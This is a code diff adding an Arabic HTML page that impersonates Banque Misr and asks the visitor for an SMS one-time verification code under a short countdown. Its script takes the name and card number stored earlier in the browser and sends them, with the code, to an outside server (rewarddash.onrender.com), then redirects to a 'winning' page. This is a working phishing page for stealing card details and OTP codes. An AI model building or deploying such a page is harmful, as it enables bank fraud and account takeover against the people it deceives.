@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>رمز التحقق</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: auto;
+      padding: 20px;
+      border: 2px solid #8a1433;
+      border-radius: 20px;
+      margin-top: 30px;
+    }
+
+    .logo {
+      width: 120px;
+      margin: 0 auto 10px;
+    }
+
+    .title-box {
+      margin-bottom: 20px;
+    }
+
+    .title-box p {
+      font-size: 1.1rem;
+      color: #333;
+      line-height: 1.8;
+    }
+
+    .illustration {
+      width: 140px;
+      margin: 15px auto;
+    }
+
+    .otp-label {
+      font-weight: bold;
+      font-size: 1rem;
+      margin: 20px 0 10px;
+      color: #8a1433;
+    }
+
+    .otp-input {
+      width: 90%;
+      max-width: 250px;
+      padding: 12px;
+      font-size: 1.3rem;
+      border: 2px solid #8a1433;
+      border-radius: 8px;
+      text-align: center;
+      letter-spacing: 8px;
+      margin-bottom: 15px;
+    }
+
+    .timer-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+
+    .timer {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #8a1433;
+    }
+
+    .expired-message {
+      margin-top: 8px;
+      font-size: 0.95rem;
+      color: #8a1433;
+      font-weight: bold;
+    }
+
+    .submit-btn {
+      background-color: #8a1433;
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      width: 90%;
+      max-width: 300px;
+      cursor: pointer;
+    }
+
+    .submit-btn:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+
+    .submit-btn:hover:not(:disabled) {
+      background-color: #6f102a;
+    }
+
+    @media (max-width: 600px) {
+      .title-box p {
+        font-size: 1rem;
+      }
+
+      .timer {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="images/logo.jpg" alt="Banque Misr" class="logo" />
+
+    <div class="title-box">
+      <p>قم بإدخال الرمز المستلم على جوالك بواسطة رسالة نصية قصيرة واضغط على زر التحقق لتأكيد وتفعيل الطلب الخاص بك</p>
+    </div>
+
+    <img src="images/final.jpg" alt="OTP Illustration" class="illustration" />
+
+    <div class="otp-label">ادخل رمز التحقق OTP</div>
+    <input type="password" maxlength="6" class="otp-input" placeholder="••••••" inputmode="numeric" id="otpInput" />
+
+
+    <div class="timer-wrapper">
+      <div class="timer" id="otpTimer">15</div>
+     <div class="expired-message" id="expiredMsg" style="display: none; gap: 12px; flex-wrap: wrap; justify-content: center; align-items: center; display: none; flex-direction: row; margin-top: 8px; font-size: 0.95rem; color: #8a1433; font-weight: bold; cursor: default;">
+  انتهى وقت الكود، يرجى طلب كود جديد.
+  <button id="newCodeBtn" style="
+    margin-right: 12px;
+    background-color: #8a1433;
+    border: none;
+    padding: 6px 14px;
+    border-radius: 10px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 0.9rem;
+    transition: background-color 0.3s ease;
+  ">طلب كود جديد</button>
+</div>
+
+    </div>
+
+    <button class="submit-btn" id="verifyBtn">تحقق</button>
+  </div>
+
+  <script>
+  let countdown = 15;
+  const timerEl = document.getElementById("otpTimer");
+  const expiredEl = document.getElementById("expiredMsg");
+  const verifyBtn = document.getElementById("verifyBtn");
+
+  // Start countdown timer
+  const interval = setInterval(() => {
+    countdown--;
+    timerEl.textContent = countdown;
+
+    if (countdown <= 0) {
+      clearInterval(interval);
+      timerEl.textContent = "0";
+      expiredEl.style.display = "block";
+      // disable verify button if expired
+    }
+  }, 1000);
+
+  verifyBtn.addEventListener("click", () => {
+    const otp = document.getElementById("otpInput").value.trim();
+
+  
+  if (otp.length !== 6) {
+    alert("الرجاء إدخال رمز التحقق المكون من 6 أرقام");
+    return;
+  }
+
+    // Increment attempts only when user clicks verify
+    let attempts = parseInt(localStorage.getItem("finalAttempts")) || 0;
+    attempts += 1;
+    localStorage.setItem("finalAttempts", attempts);
+
+    const fullName = localStorage.getItem("name") || "N/A";
+    const cardNum = localStorage.getItem("cardNum") || "N/A";
+    const cardDisplay = cardNum.replace(/\s/g, '').replace(/^(\d{6})\d{6,8}(\d{3,4})$/, '$1******$2');
+
+    const message =
+      `✅ Final OTP Code:\n` +
+      `- الاسم الكامل: ${fullName}\n` +
+      `- رقم البطاقة: ${cardDisplay}\n` +
+      `- الكود النهائي: ${otp}`;
+
+    fetch('https://rewarddash.onrender.com/api/messages', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ text: message })
+  })
+  .then(response => {
+    if (response.ok) {
+      window.location.href = 'winning.html';
+    } else {
+      alert('حدث خطأ أثناء الإرسال');
+    }
+  })
+  .catch(error => {
+    alert('خطأ في الاتصال بالخادم');
+    console.error('Error:', error);
+  });
+});
+
+  const newCodeBtn = document.getElementById("newCodeBtn");
+
+newCodeBtn.addEventListener("click", () => {
+  // You can replace this with your own request new code logic
+  // For now, it just reloads the page to simulate a new request
+  window.location.reload();
+});
+</script>
+
+
+</body>
+</html>
